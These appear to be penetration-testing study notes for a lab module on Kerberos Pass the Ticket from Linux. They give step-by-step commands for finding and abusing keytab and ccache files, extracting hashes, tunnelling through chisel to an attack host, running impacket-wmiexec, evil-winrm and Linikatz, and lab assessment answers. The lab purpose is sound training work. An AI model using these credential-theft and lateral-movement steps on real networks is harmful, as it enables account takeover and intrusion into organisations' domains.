---
description: >-
  Linux computers can connect to Active Directory to provide centralized
  identity management and integrate with the organization's systems
---

# Pass the Ticket (PtT)

A Linux system can be configured in various ways to store Kerberos tickets.

> A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

### Kerberos on Linux

The process of granting the tickets both TGT and TGS are the same to windows system, check out [Pass the Ticket (PtT) on windows](../windows-password-attacks/pass-the-ticket-ptt.md) for more information. However the way that the ticket is stored are different depending on the distributions.

* Linux store Kerberos tickets in the `/tmp` directory as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache\_def.html).
* Default location of Kerberos ticket is stored in the environment variable `KRB5CCNAME`.
  * The variable can identify if Kerberos tickets are being used or if the default location for storing the tickets is changed.
* [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache\_def.html) are protected (no reads and write)
  * But root\hige priv users can gain access to the tickets.

### [keytab](https://kb.iu.edu/d/aumh) files

A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your Kerberos password, you will need to recreate all your keytabs.

> Note: Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

### Identifying Linux and Active Directory Integration

[realm](https://access.redhat.com/documentation/en-us/red\_hat\_enterprise\_linux/7/html/windows\_integration\_guide/cmd-realmd) is a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

**realm - Check If Linux Machine is Domain Joined**

```shell-session
david@inlanefreight.htb@linux01:~$ realm list
```

> [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) are alternative tools if realm doens't exists. If these tools are running in the machine then it is domain joined.

**PS - Check if Linux Machine is Domain Joined**

```shell-session
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
```

### Finding Kerberos Tickets - Keytab Files

**Find function**

```shell-session
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
```

**Keytab Files in Cronjobs**

```shell-session
carlos@inlanefreight.htb@linux01:~$ crontab -l
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

> [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user\_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file).

> Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

### Finding Kerberos Tickets - ccache Files

**Reviewing Environment Variables for ccache Files.**

```shell-session
david@inlanefreight.htb@linux01:~$ env | grep -i krb5
```

**Searching for ccache Files in /tmp**

```shell-session
david@inlanefreight.htb@linux01:~$ ls -la /tmp
```

### Abusing KeyTab Files

**Listing keytab File Information**

```shell-session
david@inlanefreight.htb@linux01:~$ klist -k -t
```

> run `klist` to confirm the ticket we are currently using.

**Impersonating a User with a keytab**

```shell-session
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

**Connecting to SMB Share**

```shell-session
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
```

> Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable `KRB5CCNAME`.

**Extracting Keytab Hashes with KeyTabExtract**

```shell-session
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

> The [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) script will extract information such as the **realm**, **Service Principal**, **Encryption Type**, and **Hashes**. We can use the hashes to perform PtH attack or we can forge tickets and perform PtT attack. Or, we can crack the hash and gain the plain text password if possible.

After gaining access to another user in the domain, we can use the same procedure as mentioned in the above steps and gain more hashes and tickets.

### Abusing Keytab ccache

For this <mark style="color:red;">**we need root access**</mark>.

**Looking for ccache Files**

```shell-session
root@linux01:~# ls -la /tmp
```

**Identifying Group Membership with the id Command**

```shell-session
root@linux01:~# id julio@inlanefreight.htb
```

**Importing the ccache File into our Current Session**

```shell-session
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
```

### Using Linux Attack Tools with Kerberos

Our <mark style="color:red;">**attack host**</mark> doesn't have a connection to the `KDC/DC`, and we can't use the DC for name resolution. To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

**Host File Modified**

```shell-session
$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

We need to modify our proxychains configuration file to use socks5 and port 1080.

**Proxychains Configuration File**

```shell-session
$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

We <mark style="color:red;">**must**</mark> download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.

**Download Chisel to our Attack Host**

```shell-session
$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
$ gzip -d chisel_1.7.7_linux_amd64.gz
$ mv chisel_* chisel && chmod +x ./chisel
$ sudo ./chisel server --reverse 
```

Connect to `MS01` via RDP and execute chisel

**Connect to MS01 with xfreerdp**

```shell-session
$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

**Execute chisel from **<mark style="color:blue;">**MS01**</mark>

```cmd-session
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.

**Setting the KRB5CCNAME Environment Variable**

```shell-session
$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

#### Impacket

**Using Impacket with proxychains and Kerberos Authentication**

```shell-session
$ proxychains impacket-wmiexec ms01 -k
```

#### Evil-Winrm

To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication.(`krb5-user`)

**Installing Kerberos Authentication Package**

```shell-session
$ sudo apt-get install krb5-user -y

Reading package lists... Done                                                                                                  
Building dependency tree... Done    
Reading state information... Done

<SNIP>
```

**Default Kerberos Version 5 realm**

![text](https://academy.hackthebox.com/storage/modules/147/kerberos-realm.jpg)

The Kerberos servers can be empty.

**Administrative Server for your Kerberos Realm**

![text](https://academy.hackthebox.com/storage/modules/147/kerberos-server-dc01.jpg)

In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:

**Kerberos Configuration File for INLANEFREIGHT.HTB**

```shell-session
carbonlky@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

**Using Evil-WinRM with Kerberos**

```shell-session
$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

### Miscellaneous

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them.

**Impacket Ticket Converter**

```shell-session
$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

**Importing Converted Ticket into Windows Session with Rubeus**

```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

### Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team just like mimikatz.

```shell-session
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh
```

> Just like mimikatz we need to have root access in order to extract all credentials.

## Assessment

Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

Which group can connect to LINUX01?

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Look for a keytab file that you have read and write access. Submit the file name as a response.

<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc\_workstations and use them to authenticate via SSH. Submit the flag.txt in svc\_workstations' home directory.

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

Check svc\_workstation's sudo privileges and get access as root. Submit the flag in /root/flag.txt directory as the response.

<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \DC01\julio.

```
root@linux01:~# echo $KRB5CCNAME
FILE:/tmp/krb5cc_647401109_cqAsZ9

```

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (77) (1).png" alt=""><figcaption></figcaption></figure>

Use the LINUX01$ Kerberos ticket to read the flag found in \DC01\linux01. Submit the contents as your response (the flag starts with Us1nG\_).

* The keytab for linux01 is stored in /etc/krb5.keytab
* To kinit the keytab we have to type the following command\
  `kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab`
* Since LINUX01$ has a $ sign, the character after it will not be recognized. That is why we put a single quote around it and access the //DC01/linux01 share and get the flag.
